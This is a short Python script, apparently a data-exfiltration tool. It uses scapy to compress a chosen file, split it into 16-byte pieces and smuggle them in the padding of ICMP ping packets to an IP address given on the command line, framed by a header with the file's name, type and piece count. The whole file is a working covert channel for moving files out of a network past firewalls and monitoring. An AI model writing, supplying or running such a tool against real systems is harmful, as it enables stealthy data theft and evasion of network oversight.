from scapy.all import *
from sys import argv
import zlib

def sendSomething(data):
    pingr=IP(dst=ip)/ICMP()/Padding(data)
    send(pingr, verbose=False)

data = bytes()
ip = argv[1]
with open(argv[2],"r") as outfile:
    data = outfile.buffer.read()


print("Preparing text to be sent...")
print(f"Original size: {sys.getsizeof(data)}")

data_compressed=zlib.compress(data)
print(f"New size compressed: {sys.getsizeof(data_compressed)}")


slicedData = []
while (len(data_compressed) > 0):
    slicedData.append(data_compressed[:16])
    data_compressed=data_compressed[16:]


splited =  argv[2].split('.')
ftype = splited[len(splited)-1]
fname = splited[0]

header = f"ft-{ftype};fn-{fname};tb-{len(slicedData)};fp-recieved/;"

sendSomething("header")

slicedHeader = []
while(len(header) > 0):
    slicedHeader.append(header[:16])
    header=header[16:]

for h in slicedHeader:
    sendSomething(h)

sendSomething("!header")

for d in slicedData:
    sendSomething(d)

sendSomething("end transaction")
